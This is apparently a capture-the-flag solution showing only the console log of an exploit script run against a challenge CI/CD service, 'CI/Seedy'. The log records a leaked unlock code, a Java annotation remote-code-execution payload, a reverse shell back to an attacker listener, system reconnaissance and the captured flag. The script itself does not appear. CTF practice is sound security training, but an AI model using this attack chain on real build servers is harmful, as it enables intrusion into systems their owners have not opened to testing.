# Solution

```console
python exploit.py localhost 192.168.10.244
[*] Executing CI/Seedy exploit against: localhost:31337
[+] Trying to bind to :: on port 0: Done
[+] Waiting for connections on :::53037: Got connection from ::ffff:192.168.64.2 on port 32798
[*] Reverse shell listener started on: 192.168.10.244:53037
[+] Opening connection to localhost on port 31337: Done
[*] CI/Seedy v.0.2.4 - Simple CI/CD for Everyone. API ready.
[../.....] Leaking unlock code...
[+] Leaked unlock code: 3a487024-b249-4bfb-b6d4-74a7ea143c51
[*] Created temporary directory: /var/folders/lt/hdxvsybs05q2lbgbk_b7phgr0000gn/T/tmp9yyj48uk
[*] Java RCE ZIP file created.
[+] Java annotation RCE triggered. Please standby for shell.
[+] Enjoy your shell.
[*] Switching to interactive mode
/bin/sh: 0: can't access tty; job control turned off
$ Linux c3319ea49e1b 5.15.111 #1 SMP Mon May 15 16:48:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ uid=1000(seedy) gid=1000(seedy) groups=1000(seedy)
$ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 527  bytes 171858 (171.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 269  bytes 29721 (29.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ CyberBlitz{Wh4tev3r_15_ju5t_3n0ugh_b0rn_d3s3rt_5un}

$ $
```
